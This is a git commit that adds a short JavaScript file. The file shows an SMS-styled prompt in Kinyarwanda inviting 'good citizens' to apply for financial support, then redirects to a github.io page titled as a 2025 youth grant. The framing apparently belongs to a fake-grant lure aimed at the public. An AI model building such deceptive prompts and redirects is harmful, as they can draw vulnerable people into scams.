5c02ac078c9b88d3ab0e5b60ab7d6a452808b703
allregnws <promisebassey8081@gmail.com>
2025-04-19 16:36:52 +0100

    Create ma.js

---
+++ ma.js
@@ -0,0 +1,5 @@
+var password = 'MOYA'
+password=prompt('SMS :Ikaze, muturage mwiza, gutangira gusaba inkunga nyamuneka kanda OK.  ','MOYA');
+if (password != 'MOYA') {
+location.href='https://allregnws.github.io/MOYA.Youth.Grant.2025';
+}
